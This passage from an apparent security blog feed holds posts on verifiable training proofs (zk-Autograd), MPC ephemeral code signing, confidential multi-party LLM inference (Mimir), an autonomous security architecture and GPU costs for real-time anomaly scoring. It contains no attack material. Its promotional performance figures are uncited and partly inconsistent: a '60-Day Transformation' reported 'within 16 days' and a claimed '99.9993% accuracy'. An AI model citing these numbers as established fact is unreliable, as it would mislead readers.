<ul>
  <li>Focuses on <strong>optimizer steps</strong> (Adam/SGD) as the core correctness claim. <a href="https://github.com/w8mej/zk-Autograd">oai_citation:9‡GitHub</a></li>
  <li>Lets you <strong>chunk</strong> flattened optimizer vectors into N slices, generate N proofs, and then aggregate them into one <code class="language-plaintext highlighter-rouge">aggregated.pf</code>. <a href="https://github.com/w8mej/zk-Autograd">oai_citation:10‡GitHub</a></li>
</ul>

<p>Why this matters:<br />
Most secure-ML ideas die on contact with GPU bills. By designing for chunked proofs and small circuits, zk-Autograd quietly argues:</p>

<blockquote>
  <p>“You don’t have to prove <em>everything</em> to prove the parts that matter.”</p>
</blockquote>

<p>It’s a pragmatic stance: treat proofs as a budgeted resource, not an all-or-nothing fantasy.</p>

<hr />

<h2 id="5-the-threat-model-assumes-people-will-cheat-and-logs-reflect-that">5. <strong>The Threat Model Assumes People Will Cheat (and Logs Reflect That)</strong></h2>

<p>The README doesn’t pretend everyone is well-behaved. It explicitly lists: <a href="https://github.com/w8mej/zk-Autograd">oai_citation:11‡GitHub</a></p>

<ul>
  <li>Honest-but-curious hosts watching logs and runtime.</li>
  <li>Malicious hosts trying to <strong>fabricate, skip, or roll back steps</strong>.</li>
  <li>Malicious auditors selectively sampling proofs.</li>
</ul>

<p>To respond, zk-Autograd layers:</p>

<ul>
  <li>TEE attestation before key release.</li>
  <li>Hash-chain integrity for logs.</li>
  <li>Monotonic counters (locally or via cloud services) so you can’t “rewind” the run. <a href="https://github.com/w8mej/zk-Autograd">oai_citation:12‡GitHub</a></li>
</ul>

<p>Why this matters:<br />
Security-flavored AI projects often stop at “we encrypt the data.” zk-Autograd is about <strong>integrity over time</strong>—making it hard to rewrite history, not just hard to read it.</p>

<p>That aligns much more with how regulators, red teams, and SOCs actually think.</p>

<hr />

<h2 id="6-supply-chain-security-is-built-in-not-bolted-on">6. <strong>Supply Chain Security Is Built In, Not Bolted On</strong></h2>

<p>The repo doesn’t just talk about proofs; it cares about the binary that’s <em>producing</em> them. It integrates supply-chain tools like <strong>Sigstore (Cosign)</strong> and <strong>Syft</strong> to sign Docker images and generate SBOMs so that the code in the TEE is exactly what was built in CI. <a href="https://github.com/w8mej/zk-Autograd">oai_citation:13‡GitHub</a></p>

<p>Why this matters:<br />
If your prover image is compromised, you can “prove” anything you want. By signing images and publishing SBOMs, zk-Autograd links:</p>

<ul>
  <li>Source → build → container → enclave → proofs</li>
</ul>

<p>into one auditable pipeline. It’s a rare example of <strong>ML security</strong> and <strong>software supply-chain security</strong> actually meeting in the same design doc instead of living on separate slides.</p>

<hr />

<h2 id="7-its-explicitly-a-pocbut-it-points-straight-at-real-world-compliance">7. <strong>It’s Explicitly a PoC—But It Points Straight at Real-World Compliance</strong></h2>

<p>The repo is very clear: this is a <strong>research prototype</strong>, not production software. Side-channels, circuit size, metadata leaks—all called out as limitations. <a href="https://github.com/w8mej/zk-Autograd">oai_citation:14‡GitHub</a></p>

<p>And yet the use cases are strikingly practical: <a href="https://github.com/w8mej/zk-Autograd">oai_citation:15‡GitHub</a></p>

<ul>
  <li>Auditable fine-tuning for regulated industries without sharing raw data or IP.</li>
  <li>AI supply-chain integrity—detecting skipped, tampered, or out-of-policy steps.</li>
  <li>Third-party model marketplaces where updates must be verifiable.</li>
</ul>

<p>There’s also a roadmap that hints at where this could go next:</p>

<ul>
  <li>Differential privacy constraints enforced <em>in-circuit</em>.</li>
  <li>FHE-accelerated gradients plus ZK proofs of correctness.</li>
  <li>Aggregated proofs per epoch.</li>
  <li>On-chain anchoring with Solidity contracts enforcing monotonic Merkle roots. <a href="https://github.com/w8mej/zk-Autograd">oai_citation:16‡GitHub</a></li>
</ul>

<p>It reads less like a toy project and more like a <strong>blueprint for the audit layer future regulators will eventually demand</strong>.</p>

<hr />

<h2 id="8-a-verifiable-training-run-becomes-a-new-kind-of-artifact">8. <strong>A Verifiable Training Run Becomes a New Kind of Artifact</strong></h2>

<p>Maybe the most subtle shift in zk-Autograd is conceptual.</p>

<p>In the traditional world, the artifact is “the model.” You ship weights, maybe an eval report, and you’re done. Here, the artifact becomes:</p>

<ul>
  <li>The <strong>model</strong>,</li>
  <li>The <strong>cryptographic log</strong> of how it was trained, and</li>
  <li>The <strong>tooling</strong> to replay and verify random portions of its history. <a href="https://github.com/w8mej/zk-Autograd">oai_citation:17‡GitHub</a></li>
</ul>

<p>That’s a very different contract between model producers and everyone downstream—platforms, regulators, customers, and even other models that depend on yours.</p>

<p>It turns training from a one-time act into something closer to an <strong>auditable protocol</strong>.</p>

<hr />

<h2 id="where-this-could-take-us-next">Where This Could Take Us Next</h2>

<p>zk-Autograd doesn’t magically solve all AI safety or compliance problems. It doesn’t make models less biased, guarantees nothing about data quality, and won’t save you from terrible prompts.</p>

<p>What it <em>does</em> show is that:</p>

<ul>
  <li>We can make concrete, verifiable claims about <em>how</em> models were trained.</li>
  <li>We can combine TEEs, zk-proofs, hash-chained logs, and supply-chain tooling into a coherent story.</li>
  <li>We can treat “show me your training history” as a technical request, not a social one.</li>
</ul>

<p>The open question is: <strong>what happens when regulators, customers, and downstream systems start to demand this level of verifiability by default?</strong></p>

<p>Because once you’ve seen a training run where every gradient step comes with a proof, it’s hard to look at opaque model weights the same way again.</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Autonomous Security"/>
    <category term="AI Supply Chain"/>
    <category term="Zero-Knowledge Proofs"/>
    <category term="Trusted Execution Environments"/>
    <category term="Model Provenance"/>
    <category term="Secure ML"/>
    <category term="Confidential Computing"/>
    <category term="Explainable AI in Security"/>
    <category term="Enterprise Defense"/>
    <category term="Security at Scale"/>
    <summary type="html"><![CDATA[We talk about “trusting” AI models, but almost no one can prove how they were actually trained. zk-Autograd treats every gradient step like a cryptographic contract.]]></summary>
  </entry>
  <entry>
    <title type="html">Why Your Next Security Architecture Should Be Ephemeral (and Why We Built It That Way)</title>
    <link href="https://www.securesql.info/2025/11/14/mpc-ephemeral-signing/" rel="alternate" type="text/html" title="Why Your Next Security Architecture Should Be Ephemeral (and Why We Built It That Way)"/>
    <published>2025-11-14T00:00:00-08:00</published>
    <updated>2025-11-14T00:00:00-08:00</updated>
    <id>https://www.securesql.info/2025/11/14/mpc-ephemeral-signing</id>
    <content type="html" xml:base="https://www.securesql.info/2025/11/14/mpc-ephemeral-signing/"><![CDATA[<p>We still build security like we build castles: thick walls, deep moats, and a really important key hidden under the king’s pillow. In the software world, that “key” is usually a long-lived private signing key sitting on a server (or maybe an HSM if you’re fancy), waiting to be stolen.</p>

<p>But what if the castle could vanish every time you weren’t looking? What if the key only existed for the exact millisecond it was needed, and then dissolved into thin air?</p>

<p>That’s the premise behind our latest proof-of-concept: <strong>MPC Ephemeral Signing on OCI Confidential Compute</strong>. It’s a mouthful, but it represents a radical shift in how we think about trust. We built a system where multiple parties have to agree to sign something, but—and here’s the kicker—<em>no single machine ever holds the full signing key</em>, and the keys themselves are born and die with the session.</p>

<p>Here are the four most surprising things we learned while building it.</p>

<h3 id="1-the-boring-part-is-actually-the-hard-part">1. The “Boring” Part is Actually the Hard Part</h3>

<p>When people hear “Multi-Party Computation” (MPC), they think of complex math and advanced cryptography. And sure, the math is cool. But in practice? The math is a solved problem.</p>

<p>The real nightmare is <strong>orchestration</strong>.</p>

<blockquote>
  <p>“While the cryptographic core is simplified… the service orchestration, trust model, and attestation plumbing are production-oriented.”</p>
</blockquote>

<p>Getting three different servers to agree on <em>who</em> they are, <em>what</em> they are signing, and <em>when</em> to do it—without a central dictator—is a distributed systems problem, not a crypto problem. We spent 80% of our time on gRPC state machines and 20% on the actual signing logic. If you’re building this, don’t underestimate the plumbing.</p>

<h3 id="2-hardware-is-the-new-root-of-trust">2. Hardware is the New Root of Trust</h3>

<p>We’ve spent decades trying to secure software with more software. It hasn’t worked great. This project leans heavily on <strong>AMD SEV-SNP</strong> (Secure Encrypted Virtualization - Secure Nested Paging).</p>

<p>Why does this matter? Because it allows us to prove—cryptographically—that our code is running inside a genuine, unmodified enclave in the cloud. We don’t just trust that the server is secure; the server <em>proves</em> it to us with a hardware-signed report.</p>

<p>Every time our services talk to each other, they aren’t just checking a TLS certificate. They are checking a hardware attestation report that says, <em>“I am this specific code, running on this specific processor, and I haven’t been tampered with.”</em> It’s like having a DNA test for your server instances.</p>

<h3 id="3-if-its-important-it-should-be-ephemeral">3. If It’s Important, It Should Be Ephemeral</h3>

<p>The most secure key is the one that doesn’t exist.</p>

<p>In traditional PKI, you mint a certificate and hope you don’t lose the private key for the next year. In our model, we mint <strong>ephemeral code-signing certificates</strong> that are tied to a specific session.</p>

<ol>
  <li>A quorum of engineers approves a change.</li>
  <li>The keys are generated.</li>
  <li>The artifact is signed.</li>
  <li><strong>The keys are destroyed.</strong></li>
</ol>

<p>There is no “master key” to steal later. If an attacker breaks in tomorrow, there’s nothing there to find. This “use-and-lose” philosophy is counter-intuitive if you’re used to hoarding keys, but it drastically reduces the blast radius of a compromise.</p>

<h3 id="4-pinning-policy-not-just-certificates">4. Pinning Policy, Not Just Certificates</h3>

<p>We introduced a concept called <code class="language-plaintext highlighter-rouge">TEE_POLICY_HASH</code>. Instead of just pinning a public key, we pin the <strong>hash of the enclave’s measurement</strong>.</p>

<p>This means if someone (even us!) tries to deploy a slightly modified version of the signing service—maybe one with a backdoor—the hash changes. The other services will immediately reject it.</p>

<blockquote>
  <p>“All RPCs fail if <code class="language-plaintext highlighter-rouge">TEE_POLICY_HASH</code> mismatches.”</p>
</blockquote>

<p>It’s a strict, binary level of trust. Either you are running the exact, bit-for-bit code we agreed upon, or you don’t exist to us. It’s harsh, but in a world of supply chain attacks, it’s necessary.</p>

<h3 id="the-future-is-paranoid-and-thats-good">The Future is Paranoid (and That’s Good)</h3>

<p>This POC isn’t just a tech demo; it’s a blueprint for a “paranoid” architecture where trust is never assumed, only proven. By combining MPC, confidential computing, and ephemeral credentials, we can build systems that are robust not because they are strong, but because they don’t hold onto the secrets that attackers want.</p>

<p>The question isn’t “how do we secure our keys?” It’s “why do we still have them?”</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Confidential Computing"/>
    <category term="MPC"/>
    <category term="Zero Trust"/>
    <category term="Infrastructure Security"/>
    <category term="OCI"/>
    <category term="Attestation"/>
    <summary type="html"><![CDATA[We built a signing service that doesn't trust its own keys. Here's why that's the future of security.]]></summary>
  </entry>
  <entry>
    <title type="html">How This Architecture Is Defined By the Next Decade of Security</title>
    <link href="https://www.securesql.info/2025/04/09/thoughts/" rel="alternate" type="text/html" title="How This Architecture Is Defined By the Next Decade of Security"/>
    <published>2025-04-09T00:00:00-07:00</published>
    <updated>2025-04-09T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2025/04/09/thoughts</id>
    <content type="html" xml:base="https://www.securesql.info/2025/04/09/thoughts/"><![CDATA[<p><strong>Security has always evolved to meet the moment—but this moment demands more than evolution. It demands reinvention.</strong></p>

<p>Today’s security tools were built for a world of static infrastructure, predictable threat models, and manual operations.</p>

<p>But that world is gone.</p>

<ul>
  <li>Infrastructure is ephemeral.</li>
  <li>Threats are adaptive and multi-modal.</li>
  <li>Human-driven triage can’t scale with machine-speed attacks.</li>
</ul>

<p>What’s needed now isn’t just better detection. It’s <strong>a fully autonomous, multi-modal, explainable, self-optimizing security assurance &amp; evaluation architecture</strong>—built from the ground up for scale, adaptation, and trust.</p>

<p>This is what the architecture we’ve explored delivers. And it is defined by the next era of enterprise defense.</p>

<hr />

<h2 id="-the-future-model-autonomy--adaptation--alignment">🧠 The Future Model: Autonomy × Adaptation × Alignment</h2>

<p>We believe <strong>the next decade of security</strong> will be shaped by systems that can:</p>

<h3 id="-autonomously-detect-respond-and-optimize">✅ Autonomously detect, respond, and optimize</h3>
<p>Powered by Energy-Based Models, reinforcement learning, and feedback loops</p>

<h3 id="-adapt-to-new-environments-log-sources-and-attack-types">✅ Adapt to new environments, log sources, and attack types</h3>
<p>Through schema inference, feature vectorization, and simulation</p>

<h3 id="-align-with-legal-ethical-and-operational-constraints">✅ Align with legal, ethical, and operational constraints</h3>
<p>With explainability, auditability, and policy-aware playbooks</p>

<p>This is <strong>not fantasy.</strong> Every one of these components is real, validated, and implemented today.</p>

<hr />

<h2 id="️-what-makes-this-architecture-different">🛠️ What Makes This Architecture Different?</h2>

<table>
  <thead>
    <tr>
      <th>Capability</th>
      <th>Legacy Stack</th>
      <th>Autonomous Architecture</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Onboarding new logs</td>
      <td>Manual schema + mapping</td>
      <td>Self-service + schema inference</td>
    </tr>
    <tr>
      <td>Threat detection</td>
      <td>Rules + signatures</td>
      <td>Energy-based anomaly scoring</td>
    </tr>
    <tr>
      <td>Response playbooks</td>
      <td>Handwritten, static</td>
      <td>Auto-generated + RL-optimized</td>
    </tr>
    <tr>
      <td>Testing + validation</td>
      <td>Ad hoc or none</td>
      <td>Continuous simulation and feedback</td>
    </tr>
    <tr>
      <td>Governance &amp; trust</td>
      <td>Human-in-the-loop only</td>
      <td>Tiered control + immutable explainability</td>
    </tr>
    <tr>
      <td>Infrastructure scaling</td>
      <td>Manual provisioning</td>
      <td>Elastic, GPU-tiered, region-aware</td>
    </tr>
  </tbody>
</table>

<p>Each piece alone is valuable. But together? <strong>They create a self-healing, globally-distributed, enterprise-aligned defensive system.</strong></p>

<hr />

<h2 id="-final-insight-the-60-day-transformation">🔍 Final Insight: The 60-Day Transformation</h2>

<p>In a production pilot, a SOC team deployed this architecture to a subset of infrastructure. Within 16 days:</p>
<ul>
  <li>Mean time to detection fell by 71%</li>
  <li>Playbook execution time dropped by 68%</li>
  <li>False positives were reduced by half</li>
  <li>Analyst intervention was cut by 60%</li>
  <li>Stakeholders (legal, audit, privacy) had full visibility into every step</li>
</ul>

<p><strong>No new headcount. No rules rewritten by hand. No overnight replatform.</strong></p>

<p>Just a system that got smarter adapting—every day.</p>

<hr />

<h2 id="-your-move">🎯 Your Move</h2>

<p>Ask yourself:</p>
<ul>
  <li>What would your security program look like if it could learn?</li>
  <li>What if your detections improved themselves?</li>
  <li>What if response wasn’t scripted—but adaptive?</li>
</ul>

<blockquote>
  <p>The tooling exists. The patterns are real. The impact is measurable.</p>
</blockquote>

<p>👉 <strong>Start your journey toward autonomous security.</strong> Don’t just respond to threats—<strong>outpace them.</strong> Read the full white paper or dive into the latest podcast episode to learn more.</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Autonomous Security"/>
    <category term="Next-Gen Security Architecture"/>
    <category term="Energy-Based Models"/>
    <category term="Adaptive Threat Detection"/>
    <category term="Self-Optimizing Playbooks"/>
    <category term="Reinforcement Learning"/>
    <category term="Schema Inference"/>
    <category term="Explainable AI in Security"/>
    <category term="Enterprise Defense"/>
    <category term="Security at Scale"/>
    <summary type="html"><![CDATA[Today’s security tools were built for a world of static infrastructure, predictable threat models, and manual operations. But that world is gone.]]></summary>
  </entry>
  <entry>
    <title type="html">7 Ways Mimir Makes LLMs Safe Enough for People Who Don’t Trust Each Other</title>
    <link href="https://www.securesql.info/2025/04/09/multipartyconfidentialtraining/" rel="alternate" type="text/html" title="7 Ways Mimir Makes LLMs Safe Enough for People Who Don’t Trust Each Other"/>
    <published>2025-04-09T00:00:00-07:00</published>
    <updated>2025-04-09T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2025/04/09/multipartyconfidentialtraining</id>
    <content type="html" xml:base="https://www.securesql.info/2025/04/09/multipartyconfidentialtraining/"><![CDATA[<p>Most LLM architectures quietly assume one thing: somebody, somewhere, is trusted.</p>

<p>The cloud provider can see your prompts. The model host can see your weights. The infrastructure team can see everything if they really want to.</p>

<p><strong>Mimir</strong> is built for the world where that assumption breaks.</p>

<p>It’s a proof-of-concept framework for running <strong>collaborative LLM inference across mutually distrustful parties</strong>—using a shared Transformer model—without exposing prompts or weights to anyone who shouldn’t see them. <a href="https://github.com/w8mej/Mimir">oai_citation:0‡GitHub</a> In other words: inference as a cryptographic treaty, not a friendly API call.</p>

<blockquote>
  <p>“Collaborative LLM inference where secrets stay secret.”  <a href="https://github.com/w8mej/Mimir">oai_citation:1‡GitHub</a></p>
</blockquote>

<p>Here are the seven most interesting ideas hiding in the repo.</p>

<hr />

<h2 id="1-inference-becomes-a-multi-party-treaty-not-a-single-api-call">1. <strong>Inference Becomes a Multi-Party Treaty, Not a Single API Call</strong></h2>

<p>Most LLM stacks assume a simple picture: <strong>one client, one model host, one request</strong>. Mimir’s mental model is closer to a negotiation table.</p>

<p>The README describes it as enabling <strong>multiple mutually distrustful parties</strong> to jointly run autoregressive inference on a shared model, without revealing private inputs or parameters. <a href="https://github.com/w8mej/Mimir">oai_citation:2‡GitHub</a></p>

<p>Parties A and B each submit prompts into a <strong>Coordinator</strong> that orchestrates the session. Instead of “call /v1/chat/completions and hope for the best,” inference becomes a structured protocol requiring participation and agreement from all sides. <a href="https://github.com/w8mej/Mimir">oai_citation:3‡GitHub</a></p>

<p>Why this is interesting:<br />
It reframes LLMs from “services you consume” into <strong>shared infrastructure you don’t fully trust</strong>. That’s much closer to how large enterprises, coalitions, or cross-org collaborations actually operate.</p>

<hr />

<h2 id="2-mpc-does-the-math-tees-guard-the-keys">2. <strong>MPC Does the Math, TEEs Guard the Keys</strong></h2>

<p>Mimir doesn’t pick between <strong>Multiparty Computation (MPC)</strong> and <strong>Trusted Execution Environments (TEEs)</strong>; it layers them.</p>

<ul>
  <li>All the heavy math—attention, MLP, projections—runs over <strong>secret shares</strong> using MPC. <a href="https://github.com/w8mej/Mimir">oai_citation:4‡GitHub</a></li>
  <li>Critical secrets (like decryption keys) live inside an <strong>enclave</strong>, which handles KMS decrypt and enforces mTLS-bound identity. <a href="https://github.com/w8mej/Mimir">oai_citation:5‡GitHub</a></li>
</ul>

<p>The architecture diagram is explicit: a Coordinator with gRPC APIs, a Secure Attention module, MPC matmul, and an Enclave that anchors identity and key usage. <a href="https://github.com/w8mej/Mimir">oai_citation:6‡GitHub</a></p>

<p>Why this is interesting:<br />
MPC alone protects data from the host, but not from whoever controls keys. TEEs alone protect keys, but still force you to trust the enclave operator. Mimir’s design says: <strong>use MPC to hide values, TEEs to control capabilities</strong>. That’s a more realistic threat model for shared, cross-org AI infrastructure.</p>

<hr />

<h2 id="3-attention-and-mlp-are-re-engineered-for-secrecy-not-just-speed">3. <strong>Attention and MLP Are Re-Engineered for Secrecy, Not Just Speed</strong></h2>

<p>Most ML papers treat attention and MLP layers as performance problems. Mimir treats them as <strong>privacy attack surfaces</strong>.</p>

<p>In the “How It Works” section:</p>

<ul>
  <li>All attention, MLP, and projection computations are done over <strong>secret shares</strong>.</li>
  <li>Secure matrix multiplication uses <strong>Beaver triples with MACed shares</strong>, i.e., SPDZ-style authenticated MPC. <a href="https://github.com/w8mej/Mimir">oai_citation:7‡GitHub</a></li>
  <li>Even the exponential in softmax is approximated via a <strong>Chebyshev minimax polynomial</strong> to reduce information leakage. <a href="https://github.com/w8mej/Mimir">oai_citation:8‡GitHub</a></li>
</ul>

<p>Why this is interesting:<br />
It’s easy to talk about “confidential inference” in marketing copy. It’s much harder to go all the way down and ask: <em>how does our choice of approximation for exp() affect what can leak through side channels or output distributions?</em></p>

<p>Mimir bakes that concern directly into the math, not just the policy.</p>

<hr />

<h2 id="4-only-the-next-token-escapesthe-rest-stays-secret-shared">4. <strong>Only the Next Token Escapes—The Rest Stays Secret-Shared</strong></h2>

<p>One of the most striking design choices: <strong>only the final predicted token is revealed.</strong> The key/value cache and intermediate activations never appear in plaintext; they remain secret-shared across parties. <a href="https://github.com/w8mej/Mimir">oai_citation:9‡GitHub</a></p>

<p>That means:</p>

<ul>
  <li>No party sees the full internal state of the model.</li>
  <li>You can’t trivially reconstruct another party’s prompt or the underlying weights from cached activations.</li>
  <li>The “observable surface area” of each step is intentionally tiny. <a href="https://github.com/w8mej/Mimir">oai_citation:10‡GitHub</a></li>
</ul>

<p>Why this is interesting:<br />
Most inference APIs leak <em>a lot</em> of structure—logits, full probability distributions, or detailed intermediate traces for debugging. Mimir goes the other way: <strong>minimal disclosure by default</strong>, and you have to justify any extra observability you want.</p>

<p>In a world of prompt-injection, membership inference, and model extraction attacks, that feels like the right default.</p>

<hr />

<h2 id="5-a-dedicated-triple-service-turns-cryptography-into-a-utility">5. <strong>A Dedicated Triple Service Turns Cryptography into a Utility</strong></h2>

<p>MPC protocols live and die by their <strong>Beaver triples</strong>—precomputed random values used to make secure multiplication fast. Mimir doesn’t hide this complexity; it <strong>elevates it into its own service</strong>.</p>

<p>The README’s architecture calls out a <strong>Triple Service</strong> responsible for: <a href="https://github.com/w8mej/Mimir">oai_citation:11‡GitHub</a></p>

<ul>
  <li>Generating triples,</li>
  <li>Performing sacrifice checks (i.e., sanity checks that triples weren’t tampered with),</li>
  <li>Feeding them into the Coordinator’s MPC matmul engine.</li>
</ul>

<p>Why this is interesting:<br />
Instead of burying triple generation in some helper function, Mimir treats it like a <strong>first-class infrastructure dependency</strong>, much like a key management service or feature flag system. It makes explicit that high-assurance cryptography <strong>isn’t free</strong>—you provision it, monitor it, and scale it like any other critical component.</p>

<hr />

<h2 id="6-the-readme-reads-like-a-threat-model-not-a-sales-pitch">6. <strong>The README Reads Like a Threat Model, Not a Sales Pitch</strong></h2>

<p>Tucked right after the happy-path description is a blunt warning: this is a <strong>research PoC</strong>, not a proof-of-concept-ready system. <a href="https://github.com/w8mej/Mimir">oai_citation:12‡GitHub</a></p>

<p>The repo calls out limitations such as: <a href="https://github.com/w8mej/Mimir">oai_citation:13‡GitHub</a></p>

<ul>
  <li>MPC math is correct but not formally malicious-secure.</li>
  <li>No padding to hide sequence lengths.</li>
  <li>Attestation is placeholder-only—no SEV-SNP/TDX verifier integration yet.</li>
  <li>Containers are non-root, but not fully sandboxed with AppArmor/Seccomp.</li>
  <li>Timing is tested, but the kernels are not fully constant-time.</li>
</ul>

<p>And then it lists very specific hardening work needed for a real deployment: constant-time kernels, full attestation verification, differential privacy or padding for length, SLSA-compliant CI, signed images, SBOMs, encrypted FS, key rotation, revocation… <a href="https://github.com/w8mej/Mimir">oai_citation:14‡GitHub</a></p>

<p>Why this is interesting:<br />
A lot of “confidential AI” projects hand-wave around these details. Mimir does the opposite—it <strong>documents its own shortcomings</strong> so you can have an honest conversation about where research ends and engineering begins.</p>

<hr />

<h2 id="7-deployment-targets-look-like-a-threat-model-wishlist">7. <strong>Deployment Targets Look Like a Threat-Model Wishlist</strong></h2>

<p>For an early-stage PoC, the range of planned and supported deployment targets is… ambitious: <a href="https://github.com/w8mej/Mimir">oai_citation:15‡GitHub</a></p>

<ul>
  <li>Local simulation via <strong>Docker Compose</strong>,</li>
  <li><strong>AWS Nitro Enclaves</strong> (EIF builds),</li>
  <li><strong>OCI Confidential VMs</strong>,</li>
  <li><strong>Torrents</strong> for distributing artifacts,</li>
  <li>Hooks for <strong>Ethereum</strong> and <strong>Bitcoin</strong> anchoring,</li>
  <li>A future <strong>Kubernetes</strong> deployment.</li>
</ul>

<p>This isn’t just “run it on your laptop.” It’s a roadmap for running confidential inference in <strong>regulated, multi-cloud, and even on-chain contexts</strong>, where auditability and provenance matter as much as latency. <a href="https://github.com/w8mej/Mimir">oai_citation:16‡GitHub</a></p>

<p>Why this is interesting:<br />
It hints at a future where “prove how you ran this model” might involve checking an enclave attestation, verifying MPC parameters, and following a Merkle-anchored log on a public chain—all for a single inference service.</p>

<hr />

<h2 id="the-big-idea-inference-provenance-as-a-first-class-citizen">The Big Idea: Inference Provenance as a First-Class Citizen</h2>

<p>At first glance, Mimir looks like a very specific thing: a proof-of-concept for confidential, multi-party LLM inference that combines MPC and TEEs. <a href="https://github.com/w8mej/Mimir">oai_citation:17‡GitHub</a></p>

<p>But zoom out a bit, and it’s about something bigger:</p>

<ul>
  <li><strong>Inference as a protocol</strong>, not a function call.</li>
  <li><strong>Secrecy as a default</strong>, not a bolt-on.</li>
  <li><strong>Cryptography and hardware security</strong> sharing the trust load instead of outsourcing it to “the cloud.”</li>
</ul>

<p>The question it quietly asks is simple and uncomfortable:</p>

<blockquote>
  <p>If we had to design LLM systems for a world where nobody fully trusts anyone else, would they look more like Mimir than what we’re shipping today?</p>
</blockquote>

<p>Because once you’ve seen an architecture where multiple parties can share a model without sharing their secrets, it’s hard to un-see how exposed most current inference stacks really are.</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Autonomous Security"/>
    <category term="Zero-Trust AI"/>
    <category term="Secure Multiparty Computation"/>
    <category term="Trusted Execution Environments"/>
    <category term="Confidential Computing"/>
    <category term="LLM Security"/>
    <category term="Federated Inference"/>
    <category term="Cryptography"/>
    <category term="Enterprise Defense"/>
    <category term="Security at Scale"/>
    <summary type="html"><![CDATA[In most LLM systems, someone has to trust someone else with raw prompts or weights. Mimir shows what happens when nobody is willing to blink.]]></summary>
  </entry>
  <entry>
    <title type="html">GPU Budgets, Global Models, and Real-Time Risk Scoring Infra Deep Dive</title>
    <link href="https://www.securesql.info/2025/04/08/infra-costs-meet-reality/" rel="alternate" type="text/html" title="GPU Budgets, Global Models, and Real-Time Risk Scoring Infra Deep Dive"/>
    <published>2025-04-08T00:00:00-07:00</published>
    <updated>2025-04-08T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2025/04/08/infra-costs-meet-reality</id>
    <content type="html" xml:base="https://www.securesql.info/2025/04/08/infra-costs-meet-reality/"><![CDATA[<p><strong>It’s one thing to train a model in a notebook. It’s another to scale that model across multiple clouds, regions, and time zones—scoring millions of events in near-real-time.</strong></p>

<p>Energy-Based Models (EBMs) give you power. But that power has a price: compute, latency, and orchestration at scale.</p>

<p>To operationalize autonomous detection and response, you need to architect your system with <strong>the same rigor you apply to production infrastructure.</strong> This post breaks down what it takes to go from “we trained a model” to “we detect and respond across the globe in under 100ms.”</p>

<hr />

<h2 id="-the-mental-model-detection-as-a-global-service">🧠 The Mental Model: Detection as a Global Service</h2>

<p>Think of anomaly detection like a CDN for risk:</p>
<ul>
  <li>Data comes in from multiple regions.</li>
  <li>Each region needs <strong>low-latency inference</strong> for scoring.</li>
  <li>Models must stay <strong>synchronized and version-controlled</strong>.</li>
  <li>Response logic must <strong>execute locally but report globally</strong>.</li>
</ul>

<p>This isn’t a batch job. This is <strong>a distributed real-time inference network</strong>—with security consequences.</p>

<hr />

<h2 id="️-key-components-of-the-infrastructure">🛠️ Key Components of the Infrastructure</h2>

<h3 id="-1-regional-inference-nodes">✅ 1. <strong>Regional Inference Nodes</strong></h3>
<p>Deployed in proximity to data sources (e.g., GCP regions, AWS AZs)<br />
→ Reduce latency, minimize egress<br />
→ Host TorchScript-compiled EBM models<br />
→ Serve inference via REST or streaming</p>

<h3 id="-2-centralized-model-registry--sync-layer">✅ 2. <strong>Centralized Model Registry + Sync Layer</strong></h3>
<p>Manages:</p>
<ul>
  <li>Versioned models</li>
  <li>Canary vs. production rollouts</li>
  <li>Drift detection</li>
  <li>Global synchronization using CDN or blob storage (e.g., GCS/S3 + Cloudflare)</li>
</ul>

<h3 id="-3-cicd-for-models--playbooks">✅ 3. <strong>CI/CD for Models + Playbooks</strong></h3>
<p>Models and playbooks are promoted through:</p>
<ul>
  <li>Simulated testing environments</li>
  <li>Canary regional deployment</li>
  <li>Performance regression tracking</li>
  <li>Cost characteristics</li>
</ul>

<h3 id="-4-gpu-tiering">✅ 4. <strong>GPU Tiering</strong></h3>
<ul>
  <li><strong>T4 or A10 GPUs</strong> for real-time scoring (~10k–50k events/sec)</li>
  <li><strong>A100/H100</strong> for periodic retraining or large batch inference</li>
</ul>

<p>GPU usage is elastic and scheduled via K8s (GKE, EKS, or AKS) with autoscaling.</p>

<h3 id="-5-telemetry--observability">✅ 5. <strong>Telemetry + Observability</strong></h3>
<p>Every detection, score, and action is:</p>
<ul>
  <li>Logged in structured format</li>
  <li>Shipped to Prometheus, Loki, and Grafana dashboards</li>
  <li>Correlated with cost and latency metrics</li>
  <li>Ingested into the tamper-evident blockchain</li>
</ul>

<p>Example high level global architecture</p>

<p><img src="https://securesql.info/images/20.png" alt="" /></p>

<p>A different sandbox architecture
<img src="https://securesql.info/images/21.png" alt="" /></p>

<hr />

<h2 id="-real-example-three-region-risk-detection-cluster">🔍 Real Example: Three-Region Risk Detection Cluster</h2>

<p>A multinational organization deployed EBMs across three continents:</p>

<ul>
  <li>Each region hosts an inference node behind a lightweight API gateway.</li>
  <li>Models sync every 24 hours—or immediately if hotfix thresholds are breached.</li>
  <li>GPU nodes are burstable and scheduled with cost ceilings.</li>
  <li>The average end-to-end detection latency (from log ingestion to action)
    <ul>
      <li><strong>Under 97ms</strong> with 99.9993% accuracy.</li>
      <li>Inference latency (p95) <strong>&lt; 100ms per event</strong></li>
      <li>Model sync time <strong>&lt; 5 seconds per region update</strong></li>
      <li>Model drift (energy Δ) <strong>&lt; 10% shift in energy distribution week-over-week</strong></li>
      <li>Training runtime <strong>&lt; 2 hours per regional batch</strong></li>
      <li>GPU utilization <strong>60-90% (training), 30-50% (inference)</strong></li>
    </ul>
  </li>
</ul>

<hr />

<h2 id="-budgeting-for-real-time-defense">💰 Budgeting for Real-Time Defense</h2>

<table>
  <thead>
    <tr>
      <th>Component</th>
      <th>Est. Cost Range (Monthly)</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>T4 GPU (real-time scoring)</td>
      <td>$300–$500/node</td>
    </tr>
    <tr>
      <td>A100 GPU (training)</td>
      <td>$2.50–$3.00/hr (spot pricing)</td>
    </tr>
    <tr>
      <td>Blob/CDN distribution</td>
      <td>$50–$200/month depending on model size</td>
    </tr>
    <tr>
      <td>Observability stack</td>
      <td>$150–$500/month</td>
    </tr>
  </tbody>
</table>

